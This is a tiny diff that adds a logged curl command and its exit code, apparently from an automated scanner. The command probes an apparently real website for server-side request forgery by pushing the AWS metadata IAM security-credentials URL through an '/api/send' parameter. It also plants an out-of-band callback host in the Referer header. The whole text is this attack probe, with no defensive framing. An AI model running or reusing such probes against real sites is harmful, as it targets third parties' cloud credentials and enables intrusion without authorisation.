@@ -1,0 +1,4 @@
+# command: timeout 20 curl -s -m 18 -o /dev/null -H 'Referer: http://oobc54940e3c1c8.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in/s5' 'https://www.infinitycapital.bh/api/send?none=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2Fiam%2Fsecurity-credentials%2F'
+# exit_code: -1
+# ---
+
